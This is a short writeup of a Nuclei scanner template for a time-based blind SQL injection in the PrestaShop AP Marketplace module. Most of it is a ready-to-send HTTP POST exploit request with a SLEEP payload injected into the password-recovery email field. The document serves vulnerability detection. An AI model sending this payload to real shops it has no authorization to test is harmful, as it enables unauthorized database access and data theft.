# Nuclei Template: PrestaShop Ap Marketplace - SQL Injection
**Template ID:** prestashop-apmarketplace-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`prestashop-apmarketplace-sqli.yaml`)

## Vulnerability Information & PoC

## Description
The AP Marketplace Prestashop module is vulnerable to Blind/Time SQL Injection. An attacker can exploit this vulnerability to execute arbitrary SQL queries on the underlying database.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
POST /m/apmarketplace/passwordrecovery HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}
X-Requested-With: XMLHttpRequest

email="+AND+(SELECT+3472+FROM+(SELECT(SLEEP(6)))UTQK)--+IGIe&submit_reset_pwd=
```

## References
- https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/#pll_switcher
